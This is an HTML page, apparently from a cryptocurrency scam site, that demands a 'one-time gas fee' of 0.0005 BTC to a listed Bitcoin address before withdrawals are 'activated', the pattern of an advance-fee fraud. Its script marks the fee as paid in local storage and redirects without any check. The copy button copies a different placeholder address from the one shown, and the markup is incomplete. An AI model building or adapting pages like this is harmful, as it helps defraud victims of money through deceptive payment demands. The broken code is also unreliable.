<!DOCTYPE html>
<html lang="en">
<head>

<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen">
  <div class="p-8 bg-gray-800 rounded-2xl shadow-lg w-full max-w-md text-center">
    <h1 class="text-2xl font-bold mb-4">One-Time Gas Fee</h1>
    <p class="mb-4 text-gray-300">To activate withdrawals, please pay the one-time gas fee using Bitcoin.</p>

    <div class="bg-gray-700 p-4 rounded-lg mb-4">
      <p class="text-sm text-gray-400">Send exactly:</p>
      <p class="text-xl font-semibold text-green-400">0.0005 BTC</p>
      <p class="mt-2 text-sm text-gray-400">To this address:</p>
      <p class="text-sm break-words font-mono text-yellow-400">bc1qp9juaut6kgqhp00e2m64kmf76lrv54jn9vdzsf</p>
    </div>

    <button onclick="copyAddress()" class="mb-4 text-sm text-blue-400 hover:underline">Copy Address</button>

    <div class="mb-6">
      <p class="text-sm text-gray-300">Prefer bank transfer?</p>

  <script>
    function copyAddress() {
      navigator.clipboard.writeText('bc1qexamplewalletaddress123xyz');
      alert('Wallet address copied to clipboard.');
    }

    function confirmPayment() {
      localStorage.setItem('gasFeePaid', true);
      window.location.href = 'dashboard.html';
    }
  </script>
</body>
</html>
